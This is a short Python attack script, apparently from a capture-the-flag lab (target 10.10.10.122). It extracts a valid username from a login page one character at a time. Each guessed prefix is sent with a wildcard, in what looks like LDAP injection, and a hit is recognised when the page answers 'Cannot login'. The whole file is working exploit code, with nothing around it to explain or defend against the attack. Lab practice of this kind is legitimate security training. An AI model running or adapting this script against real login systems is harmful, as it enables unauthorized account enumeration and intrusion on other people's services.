#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Использование: python3 inject.py

import re
import time
from string import ascii_lowercase
from urllib.parse import quote_plus

import requests

URL = 'http://10.10.10.122/login.php'

username, done = '', False
print()

while not done:
	for c in ascii_lowercase:
		inject = username + c + quote_plus('*')

		data = {
			'inputUsername': inject,
			'inputOTP': '31337'
		}

		resp = requests.post(URL, data=data)

		match = re.search(r'<div class="col-sm-10">(.*?)</div>', resp.text, re.DOTALL)
		if match.group(1).strip() == 'Cannot login':
			username += c
			break

		print(f'[*] Username: {username}{c}', end='\r')  # sys.stdout.write(f'\r{username}{c}')
		time.sleep(0.2)

	else:
		done = True

print(f'[+] Username: {username} \n')
